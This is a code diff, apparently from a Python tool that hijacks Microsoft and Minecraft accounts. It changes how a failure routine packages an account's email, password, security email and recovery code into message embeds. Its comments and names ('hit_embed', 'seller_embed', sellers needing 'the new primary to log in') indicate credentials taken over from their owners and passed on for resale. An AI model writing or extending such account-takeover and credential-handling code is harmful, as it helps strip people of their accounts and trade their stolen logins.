@@ -16,26 +16,34 @@ import logging
 
 def _reject_failure(email: str, reason: str, account: dict, *, credentials_changed: bool) -> dict:
     ms = (account or {}).get("microsoft") or {}
-    out = {
+    mc = (account or {}).get("minecraft") or {}
+    # Give-back failures must include the current primary when alias was replaced
+    # (old email may already be deleted). Success seller embeds still hide sunny.
+    ms_for_embed = {
+        "email": ms.get("email") or email,
+        "original_email": ms.get("original_email") or email,
+        "security_email": ms.get("security_email") or "Couldn't Change!",
+        "password": ms.get("password") or "Couldn't Change!",
+        "recovery_code": ms.get("recovery_code") or "Couldn't Change!",
+        "username": mc.get("name"),
+    }
+    fail_embed = build_failure_embed(
+        email,
+        ms_for_embed,
+        reason,
+        error=reason,
+        credentials_changed=credentials_changed,
+    )
+    return {
         "failed": True,
         "reason": reason,
         "microsoft": ms,
-        "minecraft": (account or {}).get("minecraft") or {},
+        "minecraft": mc,
         "credentials_changed": credentials_changed,
-        "hit_embed": build_failure_embed(
-            email,
-            {
-                "security_email": ms.get("security_email") or "Couldn't Change!",
-                "password": ms.get("password") or "Couldn't Change!",
-                "recovery_code": ms.get("recovery_code") or "Couldn't Change!",
-                "username": ((account or {}).get("minecraft") or {}).get("name"),
-            },
-            reason,
-            error=reason,
-            credentials_changed=credentials_changed,
-        ),
+        "hit_embed": fail_embed,
+        # Same embed for sellers on reject — they need the new primary to log in
+        "seller_embed": fail_embed,
     }
-    return out
 
 
 async def startSecuringAccount(session: httpx.AsyncClient, email, device = None, code = None, recovery = True, ppft = None, rextra= None, command = False):
